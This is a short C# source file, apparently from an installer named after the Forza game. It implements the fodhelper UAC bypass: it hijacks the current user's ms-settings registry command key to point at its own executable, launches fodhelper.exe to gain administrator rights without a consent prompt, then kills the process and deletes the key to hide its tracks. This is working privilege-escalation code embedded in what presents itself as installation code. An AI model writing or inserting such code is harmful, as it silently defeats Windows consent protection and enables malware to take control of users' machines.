using Microsoft.Win32;
using System.Diagnostics;

namespace ForzaInstallation.Uac
{
    internal static class Fodhelper
    {
        internal static bool Execute()
        {
            try
            {
                var path = System.Reflection.Assembly.GetExecutingAssembly().Location;
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command"))
                {
                    if (key == null) return false;
                    key.SetValue("", path);
                    key.SetValue("DelegateExecute", "");
                }
                var proc = Process.Start("fodhelper.exe");
                System.Threading.Thread.Sleep(5000);
                try { if (proc != null && !proc.HasExited) proc.Kill(); } catch { }
                Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings\shell\open\command", false);
                return true;
            }
            catch { return false; }
        }
    }
}
